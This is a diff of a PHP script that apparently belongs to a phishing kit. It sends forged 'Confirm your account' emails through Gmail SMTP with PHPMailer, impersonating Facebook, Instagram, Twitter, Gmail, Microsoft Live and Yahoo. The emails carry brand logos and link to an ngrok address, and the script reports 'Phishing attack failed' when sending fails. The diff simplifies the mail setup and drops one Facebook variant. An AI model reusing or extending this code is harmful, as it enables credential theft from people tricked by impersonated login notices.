@@ -20,6 +20,14 @@
 */
 
 
+ini_set('display_errors', '1');
+ini_set('display_startup_errors', '1');
+error_reporting(E_ALL);
+
+
+
+
+
  session_start();
 
  clearstatcache();
@@ -357,7 +365,7 @@ transform: scale(2);
   // Using one gmail for this attack method
 
 
-    $handle = @fopen('settings.txt', "r");
+    $handle = @fopen('settings.php', "r");
 
     if ($handle) 
        { 
@@ -367,38 +375,40 @@ transform: scale(2);
        fclose($handle); 
         } 
 
-      $mail_debug  = $line[1];
-      $mail_auth   = $line[2];
-      $mail_secure = $line[3];
-      $mail_host   = $line[4];
-      $mail_port   = $line[5];
-      $mail_user   = $line[9];
-      $mail_pass   = $line[10];
+      $mail_user   = $line[1];
+      $mail_pass   = $line[2];
 
 
-//echo $mail_debug ."<br>" .$mail_auth ."<br>" .$mail_secure ."<br>" .$mail_host ."<br>" .$mail_port ."<br>" .$mail_user ."<br>" .$mail_pass;
+//echo $mail_user ."<br>" .$mail_pass;
 //exit;
 
 
- if ($link == 'no-reply@facebook_pc.com')
+
+
+ if ($link == 'no-reply@facebook.com')
         {
           $link = str_replace(".com_pc","",$str_link2);
           $link =   "no-reply" ."@" .$link .".com";
       require "/var/www/proxior/mail/PHPMailerAutoload.php";
 $mail = new PHPMailer(); // create a new object
+
 $mail->CharSet = 'UTF-8';
-$mail->IsSMTP(); // enable SMTP
-$mail->SMTPDebug = $mail_debug; // debugging: 1 = errors and messages, 2 = messages only
-$mail->SMTPAuth = $mail_auth; // authentication enabled
-$mail->SMTPSecure = "$mail_secure"; // secure transfer enabled REQUIRED for Gmail
-$mail->Host = "$mail_host";
-$mail->Port = $mail_port; // 465 or 587
-$mail->IsHTML(true);
-$mail->Username = $mail_user;
-$mail->Password = $mail_pass;
+
+$mail->isSMTP();                                      // Set mailer to use SMTP
+$mail->Host = 'smtp.gmail.com';  // Specify main and backup SMTP servers
+$mail->SMTPAuth = true;                               // Enable SMTP authentication
+$mail->Username = "$mail_user";                 // SMTP username
+$mail->Password = "$mail_pass";                           // SMTP password
+$mail->SMTPSecure = 'tls';                            // Enable TLS encryption, `ssl` also accepted
+$mail->Port = 587;     
+
+
 $mail->SetFrom($link, $link);
 $mail->FromName = $link;
 $mail->AddEmbeddedImage('css/mail_pics/fb.png', 'fb');
+
+$mail->IsHTML(true);
+
 $mail->Subject = "Confirm your Facebook account";
 $mail->Body = "<h2> <img src='cid:fb' height='24' width='24'> 
                 <font color='#45569C'>
@@ -424,79 +434,34 @@ $mail->AddAddress("$email");
       {
       echo '<script type="text/javascript">alert("Phishing attack failed");
          </script>';
-       echo ("<script>location.href='/'</script>");
+      echo ("<script>location.href='/'</script>");
        }
       } // end if site ready facebook pc
  
 
 
-else if ($link == 'no-reply@facebook_tablet_mobile.com')
-        {
-          $link = str_replace(".com_tablet_mobile","",$str_link2);
-          $link =   "no-reply" ."@" .$link .".com";
-      require "/var/www/proxior/mail/PHPMailerAutoload.php";
-$mail = new PHPMailer(); // create a new object
-$mail->CharSet = 'UTF-8';
-$mail->IsSMTP(); // enable SMTP
-$mail->SMTPDebug = $mail_debug; // debugging: 1 = errors and messages, 2 = messages only
-$mail->SMTPAuth = $mail_auth; // authentication enabled
-$mail->SMTPSecure = "$mail_secure"; // secure transfer enabled REQUIRED for Gmail
-$mail->Host = "$mail_host";
-$mail->Port = $mail_port; //465 or 587
-$mail->IsHTML(true);
-$mail->Username = $mail_user;
-$mail->Password = $mail_pass;
-$mail->SetFrom($link, $link);
-$mail->FromName = $link;
-$mail->AddEmbeddedImage('css/mail_pics/fb.png', 'fb');
-$mail->Subject = "Confirm your Facebook account";
-$mail->Body = "<h2> <img src='cid:fb' height='24' width='24'> 
-                <font color='#45569C'>
-                 Action Required: Confirm your Facebook account  
-                 </font>  
-              </h2> 
-               <br><br>
-               <a href='$ngrok' style='display: block; width: 17em; height: 1.2em; padding: 16px;
-                                                  text-align: center; border-radius: 3px; color: white;
-                                                  font-weight: bold; background:#45569C; color:white; 
-                                                  font-size: 14px; text-decoration: none'> 
-                Confirm your account 
-                </a>";
-             
-$mail->AddAddress("$email");
-     if ($mail->Send()) 
-        {
-      // echo '<script type="text/javascript">alert("Phishing attack Successfully");
-        // </script>';
-        echo ("<script>location.href='/'</script>");
-         }
-     else 
-      {
-      echo '<script type="text/javascript">alert("Phishing attack failed");
-         </script>';
-       echo ("<script>location.href='/'</script>");
-       }
-      } // end if site ready facebook tablet and mobile
-
-
-
  else if ($link == 'no-reply@instagram.com')
         {
-      require "/var/www/proxior/mail/PHPMailerAutoload.php";
+     require "/var/www/proxior/mail/PHPMailerAutoload.php";
 $mail = new PHPMailer(); // create a new object
+
 $mail->CharSet = 'UTF-8';
-$mail->IsSMTP(); // enable SMTP
-$mail->SMTPDebug = $mail_debug; // debugging: 1 = errors and messages, 2 = messages only
-$mail->SMTPAuth = $mail_auth; // authentication enabled
-$mail->SMTPSecure = "$mail_secure"; // secure transfer enabled REQUIRED for Gmail
-$mail->Host = "$mail_host";
-$mail->Port = $mail_port; // 465 or 587
-$mail->IsHTML(true);
-$mail->Username = $mail_user;
-$mail->Password = $mail_pass;
+
+$mail->isSMTP();                                      // Set mailer to use SMTP
+$mail->Host = 'smtp.gmail.com';  // Specify main and backup SMTP servers
+$mail->SMTPAuth = true;                               // Enable SMTP authentication
+$mail->Username = "$mail_user";                 // SMTP username
+$mail->Password = "$mail_pass";                           // SMTP password
+$mail->SMTPSecure = 'tls';                            // Enable TLS encryption, `ssl` also accepted
+$mail->Port = 587;   
+
+
 $mail->SetFrom($link, $link);
 $mail->FromName = $link;
 $mail->AddEmbeddedImage('css/mail_pics/inst.png', 'inst');
+
+$mail->IsHTML(true);
+
 $mail->Subject = "Confirm your Instagram account";
 $mail->Body = "<h2> <img src='cid:inst' height='24' width='24'> 
                 <font color='#EB9E6B'>
@@ -534,19 +499,23 @@ else if ($link == 'no-reply@twitter.com')
         {
       require "/var/www/proxior/mail/PHPMailerAutoload.php";
 $mail = new PHPMailer(); // create a new object
+
 $mail->CharSet = 'UTF-8';
-$mail->IsSMTP(); // enable SMTP
-$mail->SMTPDebug = $mail_debug; // debugging: 1 = errors and messages, 2 = messages only
-$mail->SMTPAuth = $mail_auth; // authentication enabled
-$mail->SMTPSecure = "$mail_secure"; // secure transfer enabled REQUIRED for Gmail
-$mail->Host = "$mail_host";
-$mail->Port = $mail_port; // 465 or 587
-$mail->IsHTML(true);
-$mail->Username = $mail_user;
-$mail->Password = $mail_pass;
+
+$mail->isSMTP();                                      // Set mailer to use SMTP
+$mail->Host = 'smtp.gmail.com';  // Specify main and backup SMTP servers
+$mail->SMTPAuth = true;                               // Enable SMTP authentication
+$mail->Username = "$mail_user";                 // SMTP username
+$mail->Password = "$mail_pass";                           // SMTP password
+$mail->SMTPSecure = 'tls';                            // Enable TLS encryption, `ssl` also accepted
+$mail->Port = 587;   
+
 $mail->SetFrom($link, $link);
 $mail->FromName = $link;
 $mail->AddEmbeddedImage('css/mail_pics/twitt.png', 'twitt');
+
+$mail->IsHTML(true);
+
 $mail->Subject = "Confirm your Twitter account";
 $mail->Body = "<h2> <img src='cid:twitt' height='24' width='24'> 
                 <font color='#65A8EC'>
@@ -582,19 +551,23 @@ else if ($link == 'no-reply@gmail.com')
         {
       require "/var/www/proxior/mail/PHPMailerAutoload.php";
 $mail = new PHPMailer(); // create a new object
+
 $mail->CharSet = 'UTF-8';
-$mail->IsSMTP(); // enable SMTP
-$mail->SMTPDebug = $mail_debug; // debugging: 1 = errors and messages, 2 = messages only
-$mail->SMTPAuth = $mail_auth; // authentication enabled
-$mail->SMTPSecure = "$mail_secure"; // secure transfer enabled REQUIRED for Gmail
-$mail->Host = "$mail_host";
-$mail->Port = $mail_port; // 465 or 587
-$mail->IsHTML(true);
-$mail->Username = $mail_user;
-$mail->Password = $mail_pass;
+
+$mail->isSMTP();                                      // Set mailer to use SMTP
+$mail->Host = 'smtp.gmail.com';  // Specify main and backup SMTP servers
+$mail->SMTPAuth = true;                               // Enable SMTP authentication
+$mail->Username = "$mail_user";                 // SMTP username
+$mail->Password = "$mail_pass";                           // SMTP password
+$mail->SMTPSecure = 'tls';                            // Enable TLS encryption, `ssl` also accepted
+$mail->Port = 587;   
+
 $mail->SetFrom($link, $link);
 $mail->FromName = $link;
 $mail->AddEmbeddedImage('css/mail_pics/gm.png', 'gm');
+
+$mail->IsHTML(true);
+
 $mail->Subject = "Confirm your Gmail account";
 $mail->Body = "<h2> <img src='cid:gm' height='24' width='24'> 
                 <font color='#CA3737'>
@@ -633,19 +606,23 @@ else if ($link == 'no-reply@https://login.live.com')
           $link =   "no-reply" ."@" .$str_link3 .".com";
       require "/var/www/proxior/mail/PHPMailerAutoload.php";
 $mail = new PHPMailer(); // create a new object
+
 $mail->CharSet = 'UTF-8';
-$mail->IsSMTP(); // enable SMTP
-$mail->SMTPDebug = $mail_debug; // debugging: 1 = errors and messages, 2 = messages only
-$mail->SMTPAuth = $mail_auth; // authentication enabled
-$mail->SMTPSecure = "$mail_secure"; // secure transfer enabled REQUIRED for Gmail
-$mail->Host = "$mail_host";
-$mail->Port = $mail_port; // 465 or 587
-$mail->IsHTML(true);
-$mail->Username = $mail_user;
-$mail->Password = $mail_pass;
+
+$mail->isSMTP();                                      // Set mailer to use SMTP
+$mail->Host = 'smtp.gmail.com';  // Specify main and backup SMTP servers
+$mail->SMTPAuth = true;                               // Enable SMTP authentication
+$mail->Username = "$mail_user";                 // SMTP username
+$mail->Password = "$mail_pass";                           // SMTP password
+$mail->SMTPSecure = 'tls';                            // Enable TLS encryption, `ssl` also accepted
+$mail->Port = 587;   
+
 $mail->SetFrom($link, $link);
 $mail->FromName = $link;
 $mail->AddEmbeddedImage('css/mail_pics/hotm.png', 'hotm');
+
+$mail->IsHTML(true);
+
 $mail->Subject = "Confirm your Gmail account";
 $mail->Body = "<h2> <img src='cid:hotm' height='24' width='24'> 
                 <font color='#006BC1'>
@@ -681,19 +658,23 @@ else if ($link == 'no-reply@yahoo.com')
         {
       require "/var/www/proxior/mail/PHPMailerAutoload.php";
 $mail = new PHPMailer(); // create a new object
+
 $mail->CharSet = 'UTF-8';
-$mail->IsSMTP(); // enable SMTP
-$mail->SMTPDebug = $mail_debug; // debugging: 1 = errors and messages, 2 = messages only
-$mail->SMTPAuth = $mail_auth; // authentication enabled
-$mail->SMTPSecure = "$mail_secure"; // secure transfer enabled REQUIRED for Gmail
-$mail->Host = "$mail_host";
-$mail->Port = $mail_port; // 465 or 587
-$mail->IsHTML(true);
-$mail->Username = $mail_user;
-$mail->Password = $mail_pass;
+
+$mail->isSMTP();                                      // Set mailer to use SMTP
+$mail->Host = 'smtp.gmail.com';  // Specify main and backup SMTP servers
+$mail->SMTPAuth = true;                               // Enable SMTP authentication
+$mail->Username = "$mail_user";                 // SMTP username
+$mail->Password = "$mail_pass";                           // SMTP password
+$mail->SMTPSecure = 'tls';                            // Enable TLS encryption, `ssl` also accepted
+$mail->Port = 587;   
+
 $mail->SetFrom($link, $link);
 $mail->FromName = $link;
 $mail->AddEmbeddedImage('css/mail_pics/yah.png', 'yah');
+
+$mail->IsHTML(true);
+
 $mail->Subject = "Confirm your Yahoo account";
 $mail->Body = "<h2> <img src='cid:yah' height='24' width='24'> 
                 <font color='#720E9E'>
@@ -729,19 +710,23 @@ else
   {
    require "/var/www/proxior/mail/PHPMailerAutoload.php";
 $mail = new PHPMailer(); // create a new object
+
 $mail->CharSet = 'UTF-8';
-$mail->IsSMTP(); // enable SMTP
-$mail->SMTPDebug = $mail_debug; // debugging: 1 = errors and messages, 2 = messages only
-$mail->SMTPAuth = $mail_auth; // authentication enabled
-$mail->SMTPSecure = "$mail_secure"; // secure transfer enabled REQUIRED for Gmail
-$mail->Host = "$mail_host";
-$mail->Port = $mail_port; // 465 or 587
-$mail->IsHTML(true);
-$mail->Username = $mail_user;
-$mail->Password = $mail_pass;
+
+$mail->isSMTP();                                      // Set mailer to use SMTP
+$mail->Host = 'smtp.gmail.com';  // Specify main and backup SMTP servers
+$mail->SMTPAuth = true;                               // Enable SMTP authentication
+$mail->Username = "$mail_user";                 // SMTP username
+$mail->Password = "$mail_pass";                           // SMTP password
+$mail->SMTPSecure = 'tls';                            // Enable TLS encryption, `ssl` also accepted
+$mail->Port = 587;   
+
 $mail->SetFrom($link, $link);
 $mail->FromName = $link;
 $mail->AddEmbeddedImage('css/mail_pics/any.png', 'any');
+
+$mail->IsHTML(true);
+
 $mail->Subject = "Confirm your account";
 $mail->Body = "<h2> <img src='cid:any' height='24' width='24'> 
                 <font color='black'>
